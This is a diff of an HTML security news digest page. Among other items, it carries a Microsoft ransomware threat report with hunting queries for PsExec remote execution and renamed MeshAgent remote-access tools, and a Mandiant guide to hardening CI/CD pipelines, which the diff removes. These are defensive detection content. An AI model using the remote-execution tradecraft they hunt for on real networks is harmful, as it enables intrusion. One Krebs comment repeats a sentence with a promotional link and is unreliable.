-[Microsoft Defender for Endpoint](https://www.microsoft.com/security/business/endpoint-security/microsoft-defender-endpoint)– Possible ransomware activity based on a known malicious extension
-– Possible compromised user account delivering ransomware-related files
-– Potentially compromised assets exhibiting ransomware-like behavior
-– Ransomware behavior detected in the file system
-– File dropped and launched from remote location
-Microsoft Security Copilot
-[Microsoft Security Copilot](https://www.microsoft.com/en-us/security/business/ai-machine-learning/microsoft-security-copilot) is [embedded in Microsoft Defender](https://learn.microsoft.com/defender-xdr/security-copilot-in-microsoft-365-defender) and provides security teams with AI-powered capabilities to summarize incidents, analyze files and scripts, summarize identities, use guided responses, and generate device summaries, hunting queries, and incident reports.
-Customers can also [deploy AI agents](https://learn.microsoft.com/defender-xdr/security-copilot-agents-defender), including the following [Microsoft Security Copilot agents](https://learn.microsoft.com/copilot/security/agents-overview), to perform security tasks efficiently:
-[Threat Intelligence Briefing agent](https://learn.microsoft.com/defender-xdr/threat-intel-briefing-agent-defender)[Phishing Triage agent](https://learn.microsoft.com/defender-xdr/phishing-triage-agent)[Threat Hunting agent](https://learn.microsoft.com/defender-xdr/advanced-hunting-security-copilot-threat-hunting-agent)[Dynamic Threat Detection agent](https://learn.microsoft.com/defender-xdr/dynamic-threat-detection-agent)
-Security Copilot is also available as a [standalone experience](https://learn.microsoft.com/en-us/copilot/security/experiences-security-copilot) where customers can perform specific security-related tasks, such as incident investigation, user analysis, and vulnerability impact assessment. In addition, Security Copilot offers [developer scenarios](https://learn.microsoft.com/copilot/security/developer/custom-agent-overview) that allow customers to build, test, publish, and integrate AI agents and plugins to meet unique security needs.
-Threat intelligence reports
-Microsoft Defender XDR customers can use the following [threat analytics](https://learn.microsoft.com/defender-xdr/threat-analytics) reports in the Defender portal (requires license for at least one Defender XDR product) to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments.
-[Actor Profile: Storm-2570](https://security.microsoft.com/threatanalytics3/5ac0e98d-7586-40fb-b282-3c4047a82924/analystreport)[Tool Profile: Qilin ransomware](https://security.microsoft.com/threatanalytics3/dbd24ce5-5045-41c1-b933-62617d2bb264)[Tool Profile: Anubis ransomware](https://security.microsoft.com/threatanalytics3/4475a27b-a5dd-41ea-a793-1523dde6ae41)[Tool Profile: DragonForce ransomware](https://security.microsoft.com/threatanalytics3/85dc80b3-622f-4eea-a3e4-4934184ef5ef)
-Microsoft Security Copilot customers can also use the [Microsoft Security Copilot integration](https://learn.microsoft.com/defender/threat-intelligence/security-copilot-and-defender-threat-intelligence?bc=%2Fsecurity-copilot%2Fbreadcrumb%2Ftoc.json&toc=%2Fsecurity-copilot%2Ftoc.json#turn-on-the-security-copilot-integration-in-defender-ti) in Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in the [embedded experience](https://learn.microsoft.com/defender/threat-intelligence/using-copilot-threat-intelligence-defender-xdr) in the Microsoft Defender portal to get more information about this threat actor.
-Hunting queries
-Microsoft Sentinel
-Microsoft Sentinel customers can run the following advanced hunting queries to find related activity in their networks:
-Hunt for PsExec-based remote execution and deployment
-DeviceProcessEvents | where Timestamp > ago(30d) | where FileName in~ ("psexec.exe", "psexec64.exe") or ProcessCommandLine has_any ("psexec.exe", "psexec64.exe") | where ProcessCommandLine has_any ("@ip.txt", "-accepteula", "\\") | project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256, DeviceId, ReportId | order by Timestamp desc |
-Hunt for renamed MeshAgent binaries and services
-let MeshAgentTerms = dynamic(["meshagent", "meshagent64", "meshcentral"]); union isfuzzy=true ( DeviceProcessEvents | where Timestamp > ago(30d) | where FileName has_any (MeshAgentTerms) or ProcessCommandLine has_any (MeshAgentTerms) or InitiatingProcessCommandLine has_any (MeshAgentTerms) | project Timestamp, DeviceName, ActionType, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256, RegistryKey="", RegistryValueName="", SourceTable="DeviceProcessEvents" ), ( DeviceFileEvents | where Timestamp > ago(30d) | where FileName has_any (MeshAgentTerms) or FolderPath has_any (MeshAgentTerms) or InitiatingProcessCommandLine has_any (MeshAgentTerms) | project Timestamp, DeviceName, ActionType, FileName, FolderPath, ProcessCommandLine="", InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256, RegistryKey="", RegistryValueName="", SourceTable="DeviceFileEvents" ), ( DeviceRegistryEvents | where Timestamp > ago(30d) | where RegistryKey has_any (MeshAgentTerms) or RegistryValueName has_any (MeshAgentTerms) or RegistryValueData has_any (MeshAgentTerms) or InitiatingProcessCommandLine has_any (MeshAgentTerms) | project Timestamp, DeviceName, ActionType, FileName="", FolderPath="", ProcessCommandLine="", InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256="", RegistryKey, RegistryValueName, SourceTable="DeviceRegistryEvents" ) | order by Timestamp desc |
-Learn more
-For the latest security research from the Microsoft Threat Intelligence community, check out the [Microsoft Threat Intelligence Blog](https://aka.ms/threatintelblog).
-To get notified about new publications and to join discussions on social media, follow us on [LinkedIn](https://www.linkedin.com/showcase/microsoft-threat-intelligence), [X (formerly Twitter)](https://x.com/MsftSecIntel), and [Bluesky](https://bsky.app/profile/threatintel.microsoft.com).
-To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the [Microsoft Threat Intelligence podcast](https://thecyberwire.com/podcasts/microsoft-threat-intelligence).</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-4" class="article-body">
+        <div id="art-7" class="article-body">
             <h2 class="article-title">AI for Offensive Security: What Works, What Does Not, and How to Adopt It</h2>
             <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/09/24/ai-for-offensive-security/" target="_blank">Original Link</a></p>
             <div class="content-text"><p>Companies&#160;frequently&#160;ask&#160;SpecterOps&#160;some version of the same question:&#160;How are you using AI in offensive security, and how can we begin using it too?&#160;They want practical guidance. Which parts of an assessment are improving now? Where does&#160;the technology&#160;still fail? What should a team&#160;learn or&#160;build&#160;first?&#160; Demystifying adversary tradecraft is part of SpecterOps’s&#160;core&#160;purpose.&#160;Through&#160;GhostWorks, we apply that purpose to&#160;AI by testing [&#8230;]</p>
@@ -230,153 +536,7 @@ To hear stories and insights from the Microsoft Threat Intelligence community ab
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-5" class="article-body">
-            <h2 class="article-title">Proactive Defense: Hardening Code Pipelines and CI/CD Infrastructure</h2>
-            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/hardening-code-pipelines-and-ci-cd-infrastructure/" target="_blank">Original Link</a></p>
-            <div class="content-text">Proactive Defense: Hardening Code Pipelines and CI/CD Infrastructure
-Mandiant
-Introduction
-The landscape of software supply chain security has undergone a significant shift. [Recent campaigns](https://cloud.google.com/blog/topics/threat-intelligence/mitigation-guidance-for-supply-chain-compromise) demonstrate that sophisticated threat actors are systematically targeting the engineering lifecycle by compromising trusted security and programming tools.
-These intrusions reveal three key tactics:
--
-Attackers target trusted security scanners, utility libraries, and AI developer tools to exploit the elevated privileges granted to these systems within build pipelines.
--
-Adversaries target developer workstations and Integrated Development Environments (IDEs) via highly tailored social engineering, malicious extensions, or typosquatted local dependencies to exfiltrate private cryptographic keys, API tokens, and active session credentials directly from local engineering environments.
--
-Rather than relying solely on compromised static credentials, attackers have escalated to advanced pipeline manipulation techniques, including GitHub Actions cache poisoning, OpenID Connect (OIDC) token extraction, and the subversion of mutable action tags to publish compromised packages that still carry legitimate cryptographic provenance.
-Building upon prior guidance ([here](https://cloud.google.com/blog/topics/threat-intelligence/mitigation-guidance-for-supply-chain-compromise), and [here](https://cloud.google.com/blog/products/identity-security/protecting-supply-chains-and-vendor-connections)), this blog provides an actionable blueprint for software and platform architects designed to safeguard the software supply chain against threat vectors that are actively being exploited, third-party risks, and architectural vulnerabilities throughout the entire Software Development Lifecycle (SDLC).
-Read on for more on how to establish continuous integration and continuous delivery/deployment (CI/CD) safeguards, strengthen developer workflows, and build robust, end-to-end defense-in-depth.
-The Multi-Layered Approach
-Treating each stage of the pipeline as independent security domains is no longer sufficient because these multi-layered attacks target vulnerabilities across the entire build pipeline. Defending against these persistent threats requires a thorough, defense-in-depth approach spanning the five key pillars of the software development lifecycle outlined in Figure 1:
-Figure 1: The five core pillars for securing the software development lifecycle
-Endpoint
-Developer workstations are high-value targets because they hold direct, privileged access to repositories, pipelines, and cloud environments. Threat actors frequently target IDEs, exploiting unmonitored local access to collect personal access tokens (PATs), SSH keys, and proprietary code. Organizations should establish a unified security layer that enforces a consistent security posture across all local host machines and cloud-based development environments.
-Local Secret Scanning
-Organizations should deploy pre-commit hooks and IDE-integrated scanning tools to detect and block secrets prior to repository commit. Standardizing local pre-commit templates ensures git trees are fully verified before changes are pushed to central servers. To minimize the impact of a potential leak, organizations should migrate from legacy classic PATs to fine-grained PATs constrained by tight time-to-live (TTL) limits and minimal, environment-specific permissions.
-Endpoint Security Management
-Organizations should configure Endpoint Detection and Response (EDR) solutions to monitor developer software integrations and enforce continuous device posture checks. EDR agents should monitor trusted IDE process trees for anomalous file access, unexpected process spawning, and unauthorized outbound network connections.
-To ensure complete alignment, these EDR compliance signals should be integrated directly with Unified Endpoint Management (UEM) systems to automatically restrict or revoke a user's ability to access Source Code Management (SCM) systems, execute pipeline tasks, or publish code if their device falls out of compliance. Necessary command-line interface (CLI) process exclusions should be strictly restricted to designated, isolated developer environments rather than applied broadly across corporate endpoints.
-IDE Standardization
-Organizations should vet and approve specific versions of IDEs, browser integrations, and third-party extensions. IDE and browser marketplaces should be restricted to allow only vetted applications, explicitly blocking unverified extensions. All integrations require a formal third-party risk management review before allowlisting. Organizations should maintain an active software asset inventory paired with strict version-pinning and centralized emergency-block capabilities to stop newly discovered threats.
-AI-Assisted Security
-Engineering teams should leverage only approved large language models (LLMs) and AI agents for pre-merge vulnerability analysis and application security testing. This boundary is critical, as threat actors have begun actively inserting malicious code into open-source Model Context Protocol (MCP) packages and tricking AI coding agents (as detailed in our accompanying [blog](https://cloud.google.com/blog/topics/threat-intelligence/mitigation-guidance-for-supply-chain-compromise/)).
-To mitigate risks like context poisoning and data exfiltration, security teams should deploy context-protection tools to validate inputs before runtime execution. Developers should, wherever possible, exclude local environment (.env) files from the workspace using platform-specific ignore configurations to prevent sensitive credentials from entering the model's context window. Organizations should maintain a human-in-the-loop control model to verify all AI-generated code before it is written to a repository.
-Isolated Developer Sandboxes
-To prevent host-level compromises, organizations should, wherever possible, require the use of containerized development environments or dedicated virtual machines (VMs). Sandboxing ensures malicious post-install scripts or dependency-poisoning attacks cannot traverse the local filesystem.
-Mounting sensitive host paths into workspace containers should be restricted to prevent compromised dependencies from executing with host privileges. Developer guest VMs should be instantiated from centralized, hardened golden images and network isolated from live production environments. All sandbox execution and network activity should integrate into centralized corporate logging.
-Code Repositories
-Source code repositories serve as the definitive source of truth for an organization's proprietary software and intellectual property. Hardening this layer requires control over user identities, strict branch governance, and continuous verification of the code history to prevent unauthorized changes from entering the lifecycle.
-Universal Identity
-Securing repositories requires strict control over user identities. Implementing a Company Managed User (CMU) model allows organizations to retain full ownership of all accounts, including outside collaborators, and enables the enforcement of phishing-resistant multi-factor authentication (MFA), such as FIDO2 compliant physical security keys or digital passkeys.
-However, CMU accounts may be inhibited from contributing to external, open-source repositories. Because of this limitation, a standard user model with MFA enforced Single sign-on (SSO) integration remains the recommended approach for teams engaged in public or open-source publishing and private collaboration.
-Regardless of the chosen account model, identity verification should be continuous. Organizations should deploy conditional access policies to verify device posture before granting access, while monitoring user API activity to quickly detect compromised sessions.
-Branch Protection
-Organizations should implement a zero direct-to-main policy, ensuring all changes flow through isolated feature branches that require peer reviews and pass automated CI checks before merging. Administrative bypass policies should be disabled. At the filesystem level, force-push activity should be restricted and monitored. Security teams should continuously analyze audit histories for chronological discrepancies to identify timeline tampering and detect unauthorized dead-drop repositories used for code exfiltration.
-Credential Lifecycle
-To prevent long-term persistence, organizations should automate credential rotation, implement just-in-time retrieval mechanisms, and establish a strict token TTL. For developer access, organizations should deprecate PATs which function essentially as static, host-stored passwords vulnerable to local infostealer malware and transition to cryptographically verified SSH-based authentication backed by hardware security keys (such as FIDO2/YubiKey or macOS Secure Enclave).
-For automated CI/CD pipelines and third-party integrations, organizations should mandate the use of GitHub Apps in place of service account PATs to leverage short-lived, highly scoped access tokens that automatically expire after one hour. Secrets should not be stored in environment variables; local environment files (.env
-) should be excluded via .gitignore
-while utilizing native platform secret features for runtime injection.
-Dependency Security
-For application manifests utilizing Semantic Versioning (SemVer), organizations should prohibit dynamic version ranges (such as carets ^, tildes ~, or wildcard * operators) that introduce dependency drift during resolution. Instead, configurations should mandate exact SemVer pinning (e.g., 1.4.2) supported by strictly enforced, cryptographically verified lockfiles
-Unverified execution vectors, such as blind "curl to bash" scripts, should be blocked in favor of direct vendor containers invoked via explicit SHA-256 digests. Organizations should implement Software Composition Analysis (SCA) paired with reachability analysis to prioritize patching vulnerabilities that are actually executed within the application path. Builds should generate a software bill of materials (SBOM) and enforce Supply-chain Levels for Software Artifacts (SLSA) Level 2+ provenance checks.
-Artifact Management
-Defending the artifact layer requires controlling what crosses the boundary into the trusted build environment. Point-in-time scanning is no longer sufficient; organizations should continuously inspect and verify upstream components before they propagate downstream.
-Dependency Cooldowns
-Organizations should mandate a minimum release-age cooldown of seven days before any newly published public package version becomes installable. Community detection often identifies and removes malicious open-source packages shortly after they are published.
-Establishing a strict seven-day buffer provides the open-source ecosystem time to detect and pull poisoned releases before they reach internal builds. This delay should be enforced at centralized registries or local configurations; for specific configuration parameters (such as configuring npm's minimumReleaseAge
-cooldown or secure Python pip indexing), see the technical implementation steps detailed in our accompanying [blog](https://cloud.google.com/blog/topics/threat-intelligence/mitigation-guidance-for-supply-chain-compromise/).
-Proxies & Quarantines
-All external packages and container images should, wherever possible, route through a centralized internal proxy that caches, inspects, and gates each component. Organizations can manage this secure boundary using [Google Artifact Registry](https://docs.cloud.google.com/artifact-registry/docs) to host private repositories, configure virtual upstream repositories, and restrict direct build-runner access to public registries. New components arriving through the proxy should be held in a quarantine state and screened, blocking builds automatically on a failed security verdict. Internal repositories should be kept distinct from public registries to prevent dependency confusion attacks, and promotion to the trusted registry should follow a deliberate, policy-driven approval path.
-Vulnerability Scanning
-Container images and third-party dependencies should undergo automated scanning at the registry layer and at runtime. Stored artifacts should be continuously re-evaluated as new vulnerabilities emerge. To manage alert volume, results should be prioritized using reachability analysis and real-world exploitation signals, such as the [CISA Known Exploited Vulnerabilities (KEV) catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog). Vulnerability Exploitability eXchange (VEX) statements should be used to suppress inapplicable findings and reduce noise.
-Image Provenance
-Verifying that an artifact came from a trusted source is as critical as confirming it is free of known vulnerabilities. Provenance establishes this trust by cryptographically signing every internally produced container image and package, then binding each one to the specific build workflow and source commit that created it. Modern signing tooling makes this practical without the burden of managing long-lived signing keys, instead tying each signing event to a build identity and recording it in a public transparency log. A signature is only meaningful when checked, so verification should be enforced at admission, restricted to the exact build identity expected, and performed against an artifact's immutable digest rather than a mutable tag.
-The same principle extends to the credentials that publish artifacts. Long-lived registry published tokens are a recurring root cause in supply chain incidents, since a stolen token lets an attacker publish poisoned versions under a trusted name. Where possible, these static tokens should be replaced with short-lived, identity-bound publishing tokens issued to a specific build workflow at the moment of release. For first-party builds, adopting a recognized provenance standard provides a consistent benchmark for how and where software was built.
-SHA Referencing
-Container image tags and action references are mutable by default, which means an upstream actor can silently replace the content behind a trusted name at any time. Pinning to an immutable cryptographic digest closes this gap, because a digest is a content hash and any change to the underlying artifact produces a different identifier, breaking the reference rather than substituting malicious content under a name the pipeline already trusts.
-Images should be pinned by digest, and third-party actions should be pinned to a full commit hash rather than a version that can be repointed. This discipline should extend across every image a build touches, not just the primary application image, since base images, sidecars, and init containers are equally viable injection points if left on mutable tags. Teams should also avoid configurations that re-resolve a mutable tag on every restart in production.
-CI/CD
-Hardening the automated pipelines within CI/CD infrastructure is a critical requirement for securing the broader software development lifecycle. Because these environments rely on an extensive web of privileged integrations to access source repositories, third-party registries, and cloud infrastructure, they function as high-value targets for adversaries. Securing these build and delivery systems requires the rigorous application of least-privilege principles, the enforcement of strict network boundaries, and the continuous verification of every trusted software component.
-Runner & Build Servers
-Hardening CI/CD infrastructure is a critical task because these pipelines require access to code repositories, dependency registries, and cloud environments. To secure these integrations, the primary defensive objective is to eliminate runner persistence. Organizations should use ephemeral, single-use runners, ensuring that every job executes in a fresh, isolated environment that is automatically destroyed upon completion. This clean-slate approach prevents cross-job contamination and denies attackers a permanent foothold. For self-hosted environments, this isolation should extend to the network layer, restricting outbound runner traffic exclusively to pre-approved registries and repository APIs to prevent data exfiltration. Furthermore, to mitigate Poisoned Pipeline Execution (PPE), the execution engine should block unvetted code from pull requests from accessing secrets or triggering deployment-grade runners until an administrator grants manual approval.
-Additionally, pipelines should protect shared build caches from tampering. Because build caches are frequently shared across branches to speed up builds, a malicious pull request can inject corrupted dependencies directly into the shared cache. If left unrestricted, a subsequent production build will retrieve this poisoned cache and run the malicious code in a trusted environment. Pipeline setups should isolate cache access strictly by branch privilege and reject cache writes from unauthenticated forks.
-Least Privilege CI/CD
--
-Federated Ephemeral Identities: Prohibit persistent automation secrets within workflows, leveraging OIDC to exchange pipeline identities for short-lived tokens.
--
-Zero-Trust Execution Scopes: Issue read-only or null-permission runner identities by default, requiring components to explicitly request minimum viable permissions.
--
-Shared State Parameterization: Prohibit the automatic inheritance of credentials across downstream templates or nested workflows to isolate sensitive variables.
--
-Runtime Governance: Restrict unsanctioned third-party plugins and marketplace actions. Security teams should also sandbox or disable package installation lifecycle scripts (using configurations like
-ignore-scripts=true
-detailed in our accompanying[blog](https://cloud.google.com/blog/topics/threat-intelligence/mitigation-guidance-for-supply-chain-compromise/)) to prevent compromised dependencies from executing arbitrary commands in build environments. -
-Environment Isolation: Segment network and IAM boundaries so that early-stage validation or linting tasks operate completely decoupled from systems possessing release authority.
--
-Immutable Branch History: Disable history-rewriting functions and force-pushing on canonical branches to maintain an append-only audit trail.
--
-IaC Validation: Scan Infrastructure-as-Code (IaC) prior to deployment to block over-privileged keys, unquoted user-parameter injections, unencrypted webhooks, and runner RBAC misconfigurations.
-Scanning Gates & Attestation
-CI/CD scanning gates act as automated quality control within the deployment process, evaluating code against set security standards and automatically halting deployments if the defined criteria are not met. Placing scanning gates as early in the process as possible alerts developers of potential vulnerabilities before they reach production:
-Secret Scanning (At the Developer Commit / PR Gate): Configure pre-commit hooks and SCM-level scanners to block developer pushes if they contain hardcoded API keys, passwords, or SSH keys. This stops secrets from ever entering your repository's permanent history.
-SAST - Static Application Security Testing (At the Pull Request / Peer Review Gate): Integrate SAST into your continuous integration (CI) tests to analyze draft code before it is merged into the main
-branch. This automatically flags structural flaws, logic vulnerabilities, or dangerous functions (like unescaped user inputs) during active development.
-SCA - Software Composition Analysis (During the Build Phase): Trigger SCA scans when your build environment resolves dependencies. By scanning your package lockfiles (e.g., package-lock.json
-or requirements.txt
-) against databases like [Google OSV](https://github.com/google/osv.dev), you can automatically fail builds that attempt to import libraries with active, known CVEs.
-Container/Image Scanning (At the Registry / Push Gate): Build automated scanners directly into your container registry pipeline. Before a newly built container image is allowlisted for production, the registry scanner should inspect its base OS packages and reject any image containing critical OS-level vulnerabilities or default root access.
-DAST - Dynamic Application Security Testing (In Staging / Pre-Deployment): Create a temporary, isolated staging instance of your running application as a deployment step. Run automated DAST tests to simulate real-world attacks (like SQL injection or cross-site scripting) against your endpoints, validating that your active runtime defense configurations are working.
-CSPM - Cloud Security Posture Management (Pre-Deployment IaC Scan & Post-Deploy): Use Policy-as-Code tools to scan your Infrastructure-as-Code (IaC) templates (like Terraform or Kubernetes manifests) before applying changes. This automatically blocks the provisioning of misconfigured cloud environments, such as overprivileged IAM roles or security groups with SSH (port 22) open to the internet.
-SBOM Generation and Attestation
-An SBOM is a complete, verifiable inventory of every component that went into a build. Generating and signing the SBOM as part of the build produces this inventory as a tamper-evident attestation rather than an after-the-fact reconstruction.
-In practice, this means generating the SBOM as a build step in a recognized format such as CycloneDX or SPDX. The resulting SBOM should be signed as an attestation tied to the artifact’s digest, preventing modifications. Signed SBOMs should then be mapped back to affected artifacts without re-scanning every image in the fleet. To keep monitoring useful, VEX statements should be used to flag findings that do not apply to the code, ensuring the inventory remains an actionable triage tool.
-Deployment
-Securing the runtime phase ensures that workloads remain protected even if an attacker manages to bypass early pipeline defenses. This operational layer acts as the final quality gate as code transitions from the build pipeline to active production.
-Workload Protection & Runtime Hardening
-Workload protection should be enforced directly on running applications and container instances to limit their execution footprint and block active exploits.
--
-Deployment Guardrails: Establish an automated security check at the entrance of your production environment to block any container that lacks a valid cryptographic signature, requests unneeded root privileges, or originates from an untrusted public registry.
--
-Workload Posture: Build workloads from hardened base images and run them on immutable infrastructure with read-only root filesystems and removed SSH capabilities to prevent post-exploit file creation or lateral directory traversal.
--
-Active Application Protection: Deploy Runtime Application Self-Protection (RASP) to block execution-level exploitation attempts like SQL injection. Protect AI workloads from prompt injection and jailbreaks using runtime guardrails such as
-[Google Model Armor](https://cloud.google.com/security/products/model-armor). -
-Just-In-Time Access: Eliminate standing administrative privileges in favor of time-bound, task-scoped access credentials that expire automatically, injecting privileged credentials at runtime only when required.
-Protecting Live Infrastructure
-Securing the surrounding network and cloud control plane shields your deployed applications from external threats, blocks lateral movement, and maintains the absolute integrity of your cloud configuration.
--
-Web Application Firewalls (WAF): Deploy edge firewalls to inspect incoming application-layer traffic, filtering out malicious payloads and blocking common web exploits, such as cross-site scripting or
-[OWASP Top 10](https://owasp.org/Top10/2025/)vulnerabilities, before they reach your backend services. -
-API Gateways and Load Balancers: Centralize edge authentication, enforce rate limits, and validate request signatures to prevent direct public exposure of application backends.
--
-Microsegmentation: Enforce granular, identity-aware network policies to isolate workloads and restrict traffic exclusively to pre-authorized service-to-service communication paths, blocking lateral network movement by default.
--
-Configuration Integrity: Deploy Policy-as-Code tooling to continuously validate the live environment against the version-controlled IaC source of truth, automatically reverting out-of-band modifications to prevent unauthorized changes.
--
-Active Posture Scanning: Run Cloud Security Posture Management (CSPM) and Cloud Native Application Protection Platforms (CNAPP) to continuously scan for cloud misconfigurations, overly permissive IAM, and exposed storage.
--
-Continuous Monitoring: Maintain complete visibility across all systems by collecting logs, system metrics, and audit events to quickly detect, trace, and respond to live security events.
-Conclusion
-Recent software supply chain campaigns demonstrate that development infrastructure, build pipelines, and developer utilities represent critical threat vectors and key points of compromise. Legacy access controls and point-in-time security scanning are insufficient to defend these environments against sophisticated intrusions. Hardening the development lifecycle requires implementing continuous, automated verification at every stage, unifying security postures across developer endpoints, code repositories, package registries, build runners, and deployment guardrails into a cohesive defensive framework.
-Ultimately, the objective of pipeline security is to build a resilient architecture capable of isolating and containing an intrusion. By automating cryptographic validation and policy enforcement from the initial code commit to the final production deployment, organizations can significantly reduce their overall attack surface, safeguard downstream consumers, and ensure that any individual compromise is rapidly isolated and resolved before it can spread.
-Acknowledgements
-This guidance would not have been possible without the assistance of Arafat Ismail, Bhavesh Dhake, Brentyn Muir, Brian Meyer, Emilio Oropeza, Eyad Mahmoud, Franklin Ramos, Gursev Singh, Omar ElAhdan, Sara Takhim, Stuart Carrera, Stuart Munro, Will Silverstone, and the Mandiant Security Transformation Services team.</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-6" class="article-body">
-            <h2 class="article-title">Hackers now exploit critical Roundcube flaw in code injection attacks</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/critical-roundcube-flaw-now-actively-exploited-in-code-injection-attacks/" target="_blank">Original Link</a></p>
-            <div class="content-text">A high-severity Roundcube Webmail vulnerability patched in May is now being actively exploited in attacks, according to the Canadian Centre for Cyber Security. [...]
-
-[Full content could not be extracted. Visit source for details.]</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-7" class="article-body">
+        <div id="art-8" class="article-body">
             <h2 class="article-title">What's New in hate_crack Since 2.0</h2>
             <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/whats-new-in-hate-crack-since-2-0" target="_blank">Original Link</a></p>
             <div class="content-text">What's New in hate_crack Since 2.0
@@ -1226,7 +1386,7 @@ if not found, and it's the Quick Crack default. The numbered list and tab comple
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-8" class="article-body">
+        <div id="art-9" class="article-body">
             <h2 class="article-title">Microsoft Plugs Nearly 1,000 Security Holes</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/09/microsoft-plugs-nearly-1000-security-holes/" target="_blank">Original Link</a></p>
             <div class="content-text">Microsoft Corp. today issued updates to plug at least 974 security holes in its Windows operating systems and other software, by far its biggest single patch batch ever. Microsoft says artificial intelligence is helping to speed the discovery of vulnerabilities, but security experts warn that many organizations already are struggling to prioritize the more human-intensive endeavor of testing and deploying so many fixes each month.
@@ -1330,63 +1490,6 @@ https://metatrends.substack.com/p/when-both-sides-of-cybersecurity
 The volume of kernel and privilege escalation patches highlights why quantitative vulnerability modeling and deterministic verification are critical for modern consumer infrastructure.
 The volume of kernel and privilege escalation patches highlights why quantitative vulnerability modeling and deterministic verification are critical for modern consumer infrastructure: https://gworky.com/tech
 Nearly 1,000 security fixes in one release is staggering! The point about AI finding vulnerabilities faster than IT teams can test and deploy patches is particularly interesting. It really highlights the need to prioritise actively exploited flaws rather than treating every vulnerability equally.</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-9" class="article-body">
-            <h2 class="article-title">Microsoft Plugs Nearly 400 Security Holes</h2>
-            <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/08/microsoft-plugs-nearly-400-security-holes/" target="_blank">Original Link</a></p>
-            <div class="content-text">Microsoft today released updates to remedy at least 398 security vulnerabilities in its Windows operating systems and supported software, including one weakness that is already being actively exploited and two others that were publicly detailed prior to today.
-August’s overstuffed bundle of patch joy from Microsoft did not eclipse its recording breaking release of [more than 570 security updates last month](https://krebsonsecurity.com/2026/07/microsoft-patches-a-record-570-security-flaws/), but it is double June’s then-record batch of [nearly 200 fixes](https://krebsonsecurity.com/2026/06/a-record-breaking-patch-tuesday-for-june-2026/#more-73788). Microsoft has attributed the recent patch deluge to vulnerability discoveries aided by artificial intelligence, and experts roundly agree that Windows users should get used to the idea of Patch Tuesdays (the second Tuesday of each month) covering hundreds of newly discovered security flaws.
-Fully 42 of the 398 flaws that Microsoft patched today earned Redmond’s most-dire “critical” rating, meaning they are severe enough that malware or malcontents could exploit them to gain remote control over a Windows computer with little to no help from the user.
-The sole known “zero day” bug fixed by Microsoft this month is [CVE-2026-68820](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-68820), a privilege escalation weakness in a core Windows component called afd.sys, which the security firm Automox describes as “the driver behind Windows socket connections on effectively every endpoint.”
-“This isn’t a front-door bug,” Automox’s Landon Miles [wrote](https://www.automox.com/blog/patch-fix-tuesday-august-2026) in a Patch Tuesday blog post. “It’s step two in a chain: an attacker phishes their way into a low-privilege foothold, then uses the driver flaw to take the box. The 7.0 score reflects the high attack complexity, because race conditions are fiddly. The exploit has to be thrown over and over until the timing lands. Someone is clearly landing it anyway.”
-[CVE-2026-62832](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-62832) is another privilege escalation flaw that Microsoft has labeled likely to be exploited; this flaw, in the Windows User Profile Service, may be related to the recent [“LegacyHive” public disclosure](https://www.theregister.com/security/2026/07/15/microsofts-serial-tormentor-drops-legacyhive-0-day/5271723) from the prolific bug hunter known as Nightmare Eclipse. The other publicly disclosed flaw is [CVE-2026-72971](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-72971), a low-impact local tampering vulnerability that Microsoft reckons is unlikely to be exploited.
-Other major software makers are likewise increasing their patch volumes and cadence thanks to AI, including Adobe which last month moved to twice-monthly security bulletins published on the 2nd and 4th Tuesday of each month. Cisco, Google, Mozilla and Oracle also are shipping updates far more frequently and abundantly.
-By all accounts, AI is quite good at finding security holes in software. But for now at least, patching the resulting bugpocalypse remains a heavily human-centric endeavor, and the jury is still out on whether AI technologies will turn out to be as good at fixing vulnerabilities as they are at finding and exploiting them. This is an important question when one considers that these same AI technologies also are suggesting fixes for the vulnerabilities they find.
-Researchers at 1Password recently [examined](https://1password.com/blog/why-ai-generated-patches-still-require-human-review) what happens when different large language models (LLMs) generate vulnerability patches for newly disclosed, complex vulnerabilities. They found the LLMs produced patches that failed to fix the flaw or added a new weakness in the process (or both) more than half the time.
-Ed Skoudis, president of the SANS Technology Institute, said his team has seen excellent results using AI to generate patches, provided there are humans in the loop to test the suggested fixes and push for iterative improvements.
-“AI is rapidly becoming astonishingly good at finding vulnerabilities, but this research shows that fixing them is a very different problem,” Skoudis wrote in a SANS newsletter today. “Don’t expect one-shot AI patching to work reliably. Instead, iterate, test, challenge, improve, and verify. AI can be an extraordinary patching partner, but today it still needs a skilled human at the keyboard.”
